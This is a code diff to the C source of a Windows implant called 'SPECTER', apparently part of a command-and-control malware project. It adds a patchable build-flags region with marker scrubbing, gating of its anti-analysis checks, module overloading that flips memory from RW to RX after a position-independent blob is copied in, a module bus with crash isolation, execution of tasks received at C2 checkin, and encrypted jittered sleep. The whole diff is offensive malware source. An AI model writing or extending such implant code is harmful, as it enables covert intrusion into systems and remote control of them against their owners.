@@ -17,10 +17,27 @@
 #include "evasion.h"
 #include "antianalysis.h"
 #include "profile.h"
+#include "bus.h"
+#include "task_exec.h"
 
 /* Implant context — file-scope static, no extern cross-TU references.
    All subsystems receive a pointer to this via init functions. */
 static IMPLANT_CONTEXT g_ctx;
+
+/* Builder-patchable build flags region.
+   Marker "SPBF" (4 bytes) + 1 byte flags value.
+   The builder locates the marker, patches the flags byte, and scrubs the
+   marker with random bytes.  volatile const prevents the compiler from
+   optimizing away reads or the marker bytes themselves. */
+static volatile const BYTE g_build_flags_region[] = {
+    'S','P','B','F',  /* marker — builder finds and scrubs this */
+    0x00              /* flags byte — builder patches this       */
+};
+
+/* Read the builder-patched build flags (safe to call before cfg_init). */
+static BYTE get_build_flags(void) {
+    return g_build_flags_region[4];
+}
 
 /* Forward declarations for cleanup */
 static void implant_cleanup(void);
@@ -125,21 +142,28 @@ void implant_entry(PVOID param) {
     syscall_wrappers_init(&g_ctx);
 
     /* ---- Step 3c: Anti-analysis checks ---- */
-    /* NOTE: Anti-analysis runs BEFORE config is loaded, so we cannot
-       check evasion_flags here.  For dev/testing builds, skip entirely.
-       In production, remove the #ifndef guard. */
-#ifndef SPECTER_DEV_BUILD
+    /* Anti-analysis runs BEFORE config is loaded.  The compile-time
+       SPECTER_DEV_BUILD flag and the builder-patchable build_flags
+       region (readable before cfg_init) both gate this check. */
     {
-        ANTIANALYSIS_CONFIG aa_cfg;
-        ANALYSIS_RESULT aa_result;
-        antianalysis_default_config(&aa_cfg);
-        ANALYSIS_TYPE aa_type = antianalysis_check(&g_ctx, &aa_cfg, &aa_result);
-        if (aa_type != ANALYSIS_CLEAN) {
-            antianalysis_respond(&g_ctx, aa_cfg.response);
-            return;
+        BOOL skip_aa = FALSE;
+#ifdef SPECTER_DEV_BUILD
+        skip_aa = TRUE;
+#endif
+        if (get_build_flags() & BUILD_FLAG_SKIP_ANTIANALYSIS)
+            skip_aa = TRUE;
+
+        if (!skip_aa) {
+            ANTIANALYSIS_CONFIG aa_cfg;
+            ANALYSIS_RESULT aa_result;
+            antianalysis_default_config(&aa_cfg);
+            ANALYSIS_TYPE aa_type = antianalysis_check(&g_ctx, &aa_cfg, &aa_result);
+            if (aa_type != ANALYSIS_CLEAN) {
+                antianalysis_respond(&g_ctx, aa_cfg.response);
+                return;
+            }
         }
     }
-#endif
 
     /* ---- Step 4: Initialize config store ---- */
     DEV_TRACE("[SPECTER] cfg_init...");
@@ -175,6 +199,10 @@ void implant_entry(PVOID param) {
                 if (pic_size > overload_size)
                     pic_size = overload_size;
                 spec_memcpy(overload_base, pic_base, pic_size);
+
+                /* Flip the overloaded section from RW → RX now that
+                   the PIC blob has been copied in. */
+                evasion_module_overload_finalize(ectx, overload_base, pic_size);
             }
         }
 
@@ -192,14 +220,27 @@ void implant_entry(PVOID param) {
         DEV_FAIL(14);
 
     /* ---- Step 6: Initialize sleep controller ---- */
+    /* Skip full sleep init for dev builds or when debug flag is set
+       (runtime check via builder-patchable flags + config build_flags). */
+    {
+        BOOL skip_sleep_init = FALSE;
 #ifdef SPECTER_DEV_BUILD
-    /* Skip sleep init in dev builds — use NtDelayExecution directly */
-    (void)0;
-#else
-    status = sleep_init(&g_ctx);
-    if (!NT_SUCCESS(status))
-        DEV_FAIL(15);
+        skip_sleep_init = TRUE;
 #endif
+        if (get_build_flags() & BUILD_FLAG_DEBUG)
+            skip_sleep_init = TRUE;
+        {
+            IMPLANT_CONFIG *scfg = cfg_get(&g_ctx);
+            if (scfg && (scfg->build_flags & BUILD_FLAG_DEBUG))
+                skip_sleep_init = TRUE;
+        }
+
+        if (!skip_sleep_init) {
+            status = sleep_init(&g_ctx);
+            if (!NT_SUCCESS(status))
+                DEV_FAIL(15);
+        }
+    }
 
     /* ---- Step 7: Initialize communications engine ---- */
     DEV_TRACE("[SPECTER] comms_init...");
@@ -209,6 +250,33 @@ void implant_entry(PVOID param) {
         DEV_FAIL((DWORD)(status & 0xFFFF));
     }
     DEV_TRACE("[SPECTER] comms_init OK — first checkin succeeded");
+
+    /* ---- Step 7a: Initialize module bus ---- */
+    DEV_TRACE("[SPECTER] bus_init...");
+    status = bus_init(&g_ctx);
+    if (!NT_SUCCESS(status)) {
+        DEV_TRACE_VAL("[SPECTER] bus_init FAILED", (DWORD)(status & 0xFFFF));
+        /* Non-fatal: module execution won't work, but built-in tasks
+           and legacy cmd execution still function. */
+    } else {
+        DEV_TRACE("[SPECTER] bus_init OK");
+
+        /* Initialize guardian thread subsystem (VEH crash isolation) */
+        status = guardian_init(&g_ctx);
+        if (!NT_SUCCESS(status)) {
+            DEV_TRACE_VAL("[SPECTER] guardian_init FAILED", (DWORD)(status & 0xFFFF));
+        } else {
+            DEV_TRACE("[SPECTER] guardian_init OK");
+        }
+
+        /* Initialize module lifecycle manager */
+        status = modmgr_init(&g_ctx);
+        if (!NT_SUCCESS(status)) {
+            DEV_TRACE_VAL("[SPECTER] modmgr_init FAILED", (DWORD)(status & 0xFFFF));
+        } else {
+            DEV_TRACE("[SPECTER] modmgr_init OK");
+        }
+    }
 
     /* ---- Step 7b: Initialize malleable C2 profile (if embedded) ---- */
     /* Profile blob is expected to be provided via config update or
@@ -248,7 +316,15 @@ void implant_entry(PVOID param) {
             consecutive_failures = 0;
         }
 
-        /* TODO Phase 04+: process received tasks here */
+        /* Process received tasks from this checkin */
+        if (g_ctx.pending_task_count > 0) {
+            DEV_TRACE_VAL("[SPECTER] tasks received", g_ctx.pending_task_count);
+            for (DWORD ti = 0; ti < g_ctx.pending_task_count; ti++) {
+                execute_task(&g_ctx, &g_ctx.pending_tasks[ti]);
+            }
+            /* Free task data buffers and reset count */
+            task_free_pending(&g_ctx);
+        }
 
         /* Check kill date */
         if (cfg_check_killdate(&g_ctx)) {
@@ -256,17 +332,30 @@ void implant_entry(PVOID param) {
             break;
         }
 
-        /* Sleep with jitter and memory encryption */
-#ifdef SPECTER_DEV_BUILD
-        /* Dev build: simple 5-second NtDelayExecution sleep */
+        /* Sleep with jitter and memory encryption.
+           Debug mode (compile-time or runtime) uses a simple 5-second
+           NtDelayExecution sleep instead of the full sleep_cycle. */
         {
-            LARGE_INTEGER delay;
-            delay.QuadPart = -50000000LL; /* 5 seconds in 100ns units */
-            spec_NtDelayExecution(FALSE, &delay);
-        }
-#else
-        sleep_cycle(&g_ctx);
+            BOOL use_simple_sleep = FALSE;
+#ifdef SPECTER_DEV_BUILD
+            use_simple_sleep = TRUE;
 #endif
+            if (get_build_flags() & BUILD_FLAG_DEBUG)
+                use_simple_sleep = TRUE;
+            {
+                IMPLANT_CONFIG *slp_cfg = cfg_get(&g_ctx);
+                if (slp_cfg && (slp_cfg->build_flags & BUILD_FLAG_DEBUG))
+                    use_simple_sleep = TRUE;
+            }
+
+            if (use_simple_sleep) {
+                LARGE_INTEGER delay;
+                delay.QuadPart = -50000000LL; /* 5 seconds in 100ns units */
+                spec_NtDelayExecution(FALSE, &delay);
+            } else {
+                sleep_cycle(&g_ctx);
+            }
+        }
     }
 
     /* ---- Cleanup and exit ---- */
@@ -275,6 +364,18 @@ void implant_entry(PVOID param) {
 }
 
 static void implant_cleanup(void) {
+    /* Shut down module bus subsystems (kill running modules, remove VEH) */
+    if (g_ctx.module_bus) {
+        MODULE_MANAGER *mgr = modmgr_get();
+        if (mgr)
+            modmgr_shutdown(mgr);
+        guardian_shutdown();
+    }
+
+    /* Free any remaining pending tasks and results */
+    task_free_pending(&g_ctx);
+    task_free_results(&g_ctx);
+
     /* Zero sensitive data from global context */
     IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
     if (cfg)
